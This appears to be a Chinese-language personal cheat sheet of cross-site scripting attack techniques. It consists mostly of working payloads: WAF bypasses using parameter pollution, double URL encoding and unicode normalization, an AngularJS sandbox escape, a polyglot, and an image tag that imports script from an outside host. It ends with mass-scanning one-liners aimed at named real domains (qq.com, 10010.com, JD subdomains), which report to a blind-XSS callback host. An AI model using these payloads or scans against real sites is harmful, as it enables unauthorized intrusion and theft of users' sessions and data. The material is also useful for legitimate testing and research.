# XSS

## 2021.2.13 Fuzz技巧

![image-20210213152848214](XSS.assets/image-20210213152848214.png)

非常不错,包含了xml和xss的许多payload

```
npm install -g pown
pown modules install @pown/dicts
pown dicts -p xss >  xss.doc
ls -lah xss.doc
```



基于javascript下的绕过:

原理:

```
B=1
B["constructor"]["constructor"]("alert(1)")();
```

不同语言版:https://t.co/cqmLwZmuo5?amp=1





## Bypass

![5934BE93A312FA7C13363F1A4C187775](XSS.assets/5934BE93A312FA7C13363F1A4C187775.png)



>Reflected XSS Akami Waf Bypass in Redirect Parameter using HTTP Parameter Pollution and Double Url Encode:

```
/login?ReturnUrl=javascript:1&ReturnUrl=%2561%256c%2565%2572%2574%2528%2564%256f%2563%2575%256d%2565%256e%2574%252e%2564%256f%256d%2561%2569%256e%2529
```



## 执行弹框的方法

```
<Img Src=//X55.is OnLoad=import(src)>
<Img+Src=//X55.is+OnLoad=import(src)>#confirm(document.domain)//
```



## 遇到ASP.net类型可以尝试unicode绕过

```
Xss in asp pages reflected inside span and < blocked.
Payloads:
%u003Csvg onload=alert(1)>
%u3008svg onload=alert(2)> 
%uFF1Csvg onload=alert(3)>
```





### unicode绕过checklist:

https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html



![EdH22_MXsAAYcKK](XSS.assets/EdH22_MXsAAYcKK.jpeg)

```
-->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>
```





如果允许但引号逃逸,闭合可以采用运算来避免错误。

```
<, > ==> REMOVED
'-anything()-' ==> '-anything-'
'-alert()-' ==> REMOVED
'-setTimeout``-' = allowed

Final Payload:
'-setTimeout`prompt\u0028document.domain\u0029`-
```





### 双引号被转义的时候逃逸

```
<xhzeem/x=" onmouseover=eva&#x6c;?.(id+/(document.domain)/.source) id=confirm>

Works in cases where double quotes are escaped 

<xhzeem/x=\" ....>

```



## alert(1) 绕过技巧

```
window.alert?.() and (window?.alert)`` 
```



## 挖掘XSS技巧

### 组件漏洞

an AngularJS Client-Side Template Injection as XSS payload for 1.2.24-1.2.29

Payload:

```
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```



## Dorks

```
1.iconUrl=XSS
```



## 探测XSS的payload

Polyglot payload:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```





## one-liner

```bash
python3 paramspider.py --domain qq.com -s TRUE -e js,css,woff,ttf,svg --output hackerone.txt

cat output/hackerone.txt| deduplicate --hide-images --sort | sed '1,4d'|httpx -status-code -mc 200 -silent | awk '{print $1}' |dalfox pipe --silence -b 360cdn.xss.ht | cut -d " " -f2

cat output/baidu.txt | deduplicate --hide-images --sort | sed '1,4d'|httpx -status-code -mc 200 -silent | awk '{print $1}' | dalfox pipe --silence -b 360cdn.xss.ht

cat src.txt| xargs -I {} python3 paramspider.py --domain {}  -s TRUE -e js,css,woff,ttf,svg,png,gif,jpg,PNG --output ./src/{}.txt

cat src.txt| xargs -I {} python3 paramspider.py --domain {}  -s TRUE -e 3g2,3gp,7z,aac,abw,aif,aifc,aiff,arc,au,avi,azw,bin,bmp,bz,bz2,cmx,cod,csh,css,csv,doc,docx,eot,epub,gif,gz,ico,ics,ief,jar,jfif,jpe,jpeg,jpg,m3u,mid,midi,mjs,mp2,mp3,mpa,mpe,mpeg,mpg,mpkg,mpp,mpv2,odp,ods,odt,oga,ogv,ogx,otf,pbm,pdf,pgm,png,pnm,ppm,ppt,pptx,ra,ram,rar,ras,rgb,rmi,rtf,snd,svg,swf,tar,tif,tiff,ttf,vsd,wav,weba,webm,webp,woff,woff2,xbm,xls,xlsx,xpm,xul,xwd,zip,zip,apk --output ./src/{}.txt

cat all_jd_sub_domain.txt|deduplicate|httpx -status-code -mc 200,301 -silent| awk '{print $1}' > 200_sub_jd.txt

cat src.txt| xargs -I {} | &&  cat ./src/*.txt | deduplicate --hide-images --sort | sed '1,4d'|httpx -status-code -mc 200 -silent | awk '{print $1}' >  src_url.txt && python3 removeDepeat.py && cat remove_src_url.txt | dalfox pipe --mass-worker 50 -b 360cdn.xss.ht  -o final_xss.txt

xargs -P 3 -I {} paramspider --domain {}  -s TRUE -e js,css,woff,ttf,svg,png,gif,jpg,PNG,apk,mp4,mp3,jpeg --output ./src/{}.txt
dalfox file 200_all_url.txt --mass-worker 50 -b 360cdn.xss.ht  -o final_xss.txt


dalfox pipe --mass-worker 50 -b 360cdn.xss.ht  -o final_xss.txt
dalfox file all_url.txt --mass-worker 50 -b 360cdn.xss.ht  --deep-domxss   -o final_xss.txt
dalfox file all_url.txt --mass-worker 50 -b 360cdn.xss.ht  -o final_xss.txt

dalfox  file 1.txt -S --mining-dict --only-discovery --timeout 2 --waf-evasion --mass-worker 100 -b 360cdn.xss.ht  -o final_xss_4.txt

dalfox  file 1.txt --silence  --skip-mining-all  --timeout 2 --waf-evasion --mass-worker 100 -b 360cdn.xss.ht  -o final_xss_4.txt

# Test notifier

1.subfinder -d 10010.com | httpx | tee 10010.txt
2.echo "http://m.client.10010.com" | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars";done | tee 10010.out

# 获取主域名
cat ok_xss.txt|MoreFind -d --root|xargs|tr ' ' ','
```



## 收集URL

```
gospider -s "https://passport.haodf.com/" --cookie "" -o output -c 10 -d 1 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|svg)" 
```





## XSS相关的网站

比较安全:`https://xsshunter.com/` e